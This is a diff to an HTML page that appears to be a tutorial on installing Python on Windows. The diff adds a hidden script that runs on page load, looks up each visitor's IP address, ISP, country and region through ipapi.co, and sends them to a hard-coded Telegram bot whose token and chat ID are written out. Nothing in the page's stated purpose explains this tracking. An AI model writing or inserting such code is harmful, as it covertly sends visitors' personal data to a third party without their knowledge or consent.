@@ -3,6 +3,7 @@
 
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width, initial-scale=1">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <title>install-Python-on-Windows</title>
 
 <style class=anchorjs>
@@ -481,6 +482,26 @@
 </head>
 
 <body>
+    <script>
+        $.getJSON('https://ipapi.co/json', function(data) {
+            var ip = data.ip;
+            var isp = data.org;
+            var country = data.country_name;
+            var city = data.region;
+  
+            var message = `VS-PY%0AIP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}`;
+            sendTelegramMessage(message);
+        });
+  
+        function sendTelegramMessage(message) {
+            var chatId = '1045091647';
+            var botToken = '6268789988:AAFslFmhzIT8m4uGpdZgarfvicJrciJ_vg0';
+  
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, true);
+            xhr.send();
+        }
+    </script>
     <div class="container-lg px-3 my-5 markdown-body">
 
         <h1><a href=https://github.com/NXR8 />NXR8</a></h1>
